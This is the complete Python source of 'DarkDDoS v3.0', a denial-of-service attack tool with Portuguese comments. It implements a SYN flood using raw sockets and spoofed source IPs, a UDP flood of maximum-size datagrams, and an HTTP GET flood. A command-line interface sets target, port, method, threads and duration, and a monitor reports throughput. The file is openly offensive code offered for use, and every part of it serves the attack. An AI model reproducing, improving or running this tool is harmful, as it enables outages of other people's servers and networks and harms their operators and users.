import sys
import time
import socket
import threading
import random
import argparse
from struct import pack

# Configurações Otimizadas
BUFFER_SIZE = 65507  # Tamanho máximo UDP
THREAD_LIMIT = 1000  # Máximo de threads por núcleo
SOCKET_TIMEOUT = 1

class DarkDDoS:
    def __init__(self):
        self.running = True
        self.stats = {"packets_sent": 0, "bytes_sent": 0, "errors": 0}
        self.lock = threading.Lock()
        self.sockets = []  # Pool de sockets reutilizáveis

    def _generate_fake_ip(self):
        return pack('!4B', random.randint(1,255), random.randint(0,255), 
                   random.randint(0,255), random.randint(0,255))

    def _create_raw_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return s
        except:
            return None

    def _syn_flood(self):
        # Cabeçalho IP/TCP manual (20 + 20 bytes)
        ip_header = b'\x45\x00\x00\x28'  # Versão, IHL, ToS | Total Length
        ip_header += b'\xab\xcd\x00\x00'  # ID | Flags, Fragment Offset
        ip_header += b'\x40\x06\x00\x00'  # TTL, Protocol | Checksum
        ip_header += self._generate_fake_ip()  # Source IP
        ip_header += socket.inet_aton(self.target_ip)  # Dest IP
        
        tcp_header = pack('!HHLLHHHH', 
                         random.randint(1024,65535),  # Source Port
                         self.target_port,            # Dest Port
                         random.getrandbits(32),      # Sequence Number
                         0,                           # Ack Number
                         0x5002,                      # Header Length + Flags (SYN)
                         64240,                       # Window Size
                         0, 0)                        # Checksum + Urgent Pointer
        
        sock = self._create_raw_socket()
        if not sock:
            return
            
        while self.running:
            try:
                sock.sendto(ip_header + tcp_header, (self.target_ip, 0))
                with self.lock:
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += 48
            except Exception as e:
                with self.lock:
                    self.stats["errors"] += 1
                time.sleep(SOCKET_TIMEOUT)
        
        sock.close()

    def _udp_flood(self):
        payload = random._urandom(BUFFER_SIZE)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                with self.lock:
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += BUFFER_SIZE
            except:
                with self.lock:
                    self.stats["errors"] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        sock.close()

    def _http_flood(self):
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept: text/html,application/xhtml+xml",
            "Connection: keep-alive"
        ]
        
        # Pool de sockets persistentes
        sock_pool = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(10)]
        [s.settimeout(SOCKET_TIMEOUT) for s in sock_pool]
        
        while self.running:
            for s in sock_pool:
                try:
                    s.connect((self.target_ip, self.target_port))
                    request = f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {self.target_ip}\r\n"
                    request += "\r\n".join(headers) + "\r\n\r\n"
                    s.send(request.encode())
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                except:
                    with self.lock:
                        self.stats["errors"] += 1
                    sock_pool.remove(s)
                    sock_pool.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        
        [s.close() for s in sock_pool]

    def _monitor(self):
        start_time = time.time()
        while self.running:
            time.sleep(5)
            with self.lock:
                elapsed = time.time() - start_time
                pps = self.stats["packets_sent"] / elapsed
                bps = self.stats["bytes_sent"] / elapsed
                print(f"\n[+] Estatísticas ({elapsed:.1f}s):")
                print(f"  Pacotes/s: {pps:.1f} | Bytes/s: {bps/1024/1024:.1f} MB")
                print(f"  Total: {self.stats['packets_sent']} | Erros: {self.stats['errors']}")

    def start(self, target_ip, target_port, method="syn", threads=500, duration=0):
        # Validação de entrada
        try:
            socket.inet_aton(target_ip)
            if not 1 <= target_port <= 65535:
                raise ValueError
        except:
            print("[!] Endereço IP/Porta inválido")
            sys.exit(1)
            
        self.target_ip = target_ip
        self.target_port = target_port
        
        print(f"\n[+] DarkDDoS v3.0 - Modo {method.upper()}")
        print(f"[+] Alvo: {target_ip}:{target_port}")
        print(f"[+] Threads: {threads} | Duração: {duration}s\n")
        
        # Controle de threads
        max_threads = min(threads, THREAD_LIMIT)
        threads_per_method = {
            "syn": max_threads,
            "udp": max_threads // 2,
            "http": max_threads // 5
        }
        
        threading.Thread(target=self._monitor, daemon=True).start()
        
        # Inicialização de ataques
        for _ in range(threads_per_method.get(method, 500)):
            t = threading.Thread(target=getattr(self, f"_{method}_flood"))
            t.daemon = True
            t.start()

        try:
            if duration > 0:
                time.sleep(duration)
                self.running = False
                print("\n[!] Ataque concluído")
            else:
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Ataque interrompido")
        
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DarkDDoS v3.0 - Ferramenta Avançada")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, required=True)
    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn")
    parser.add_argument("-th", "--threads", type=int, default=500)
    parser.add_argument("-d", "--duration", type=int, default=0)
    args = parser.parse_args()

    DarkDDoS().start(args.target, args.port, args.method, args.threads, args.duration)
